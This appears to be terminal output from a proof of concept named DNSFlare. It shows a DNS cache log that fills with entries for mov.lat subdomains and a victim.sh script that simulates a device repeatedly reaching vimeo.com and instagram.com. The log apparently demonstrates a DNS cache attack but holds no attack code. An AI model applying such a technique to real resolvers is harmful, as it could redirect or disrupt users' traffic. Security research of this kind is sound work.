+{19:34:40:645} [CACHED] Cache queue cycled with 100 new entries for f1.s2.mov.lat..
+{19:34:40:648} [CACHED] Cache queue cycled with 100 new entries for f6.s2.mov.lat..
+{19:34:40:651} [CACHED] Cache queue cycled with 100 new entries for f2.s2.mov.lat..
+{19:34:43:398} [MISS] instagram.com. (A) searching on 8.8.8.8...
+{19:34:43:561} [CACHED] Cache queue cycled with 1 new entries for instagram.com..
+{19:34:46:582} [HIT] instagram.com. (A) found on cache
+{19:34:47:049} [MISS] vimeo.com. (A) searching on 8.8.8.8...
+{19:34:47:147} [CACHED] Cache queue cycled with 2 new entries for vimeo.com..
+{19:34:47:355} [HIT] instagram.com. (A) found on cache
+{19:34:48:072} [CACHED] Cache queue cycled with 100 new entries for f3.s2.mov.lat..
+{19:34:48:075} [CACHED] Cache queue cycled with 100 new entries for f10.s2.mov.lat..
+{19:34:48:084} [CACHED] Cache queue cycled with 100 new entries for f18.s2.mov.lat..
+{19:34:48:087} [CACHED] Cache queue cycled with 100 new entries for f11.s2.mov.lat..
+{19:34:48:280} [CACHED] Cache queue cycled with 100 new entries for f12.s2.mov.lat..
+{19:34:48:282} [CACHED] Cache queue cycled with 100 new entries for f0.s2.mov.lat..
+
+Terminal 4 -----------------------------------------------------------------------------
+
+╭─┤ phlipow├─┤  kali├─┤  ~/DNSFlare/PoC│
+╰→ ./victim.sh vimeo.com
+{19:32:58:052} Simulating victim's device
+{19:32:58:054} Target domains: vimeo.com
+
+{19:32:58:058} [ACCESSING] vimeo.com
+{19:33:01:103} [ACCESSING] vimeo.com
+{19:33:04:140} [ACCESSING] vimeo.com
+{19:33:07:168} [ACCESSING] vimeo.com
+{19:33:10:206} [ACCESSING] vimeo.com
+{19:33:13:225} [ACCESSING] vimeo.com
+{19:33:16:245} [ACCESSING] vimeo.com
+{19:33:19:287} [ACCESSING] vimeo.com
+{19:33:22:307} [ACCESSING] vimeo.com
+{19:33:25:328} [ACCESSING] vimeo.com
+{19:33:28:373} [ACCESSING] vimeo.com
+{19:33:31:393} [ACCESSING] vimeo.com
+{19:33:34:415} [ACCESSING] vimeo.com
+{19:33:37:453} [ACCESSING] vimeo.com
+{19:33:40:473} [ACCESSING] vimeo.com
+{19:33:43:494} [ACCESSING] vimeo.com
+^C
+
+╭─┤ phlipow├─┤  kali├─┤  ~/DNSFlare/PoC│
+╰→ ./victim.sh instagram.com
+{19:34:16:072} Simulating victim's device
+{19:34:16:073} Target domains: instagram.com
+
+{19:34:16:074} [ACCESSING] instagram.com
+{19:34:19:129} [ACCESSING] instagram.com
+{19:34:22:165} [ACCESSING] instagram.com
+{19:34:25:185} [ACCESSING] instagram.com
+{19:34:28:231} [ACCESSING] instagram.com
+{19:34:31:251} [ACCESSING] instagram.com
+{19:34:34:293} [ACCESSING] instagram.com
+{19:34:37:313} [ACCESSING] instagram.com
+{19:34:40:333} [ACCESSING] instagram.com
+{19:34:43:384} [ACCESSING] instagram.com
+{19:34:46:568} [ACCESSING] instagram.com
+{19:34:49:588} [ACCESSING] instagram.com
+{19:34:52:628} [ACCESSING] instagram.com
+{19:34:55:648} [ACCESSING] instagram.com
+{19:34:58:672} [ACCESSING] instagram.com
+^C
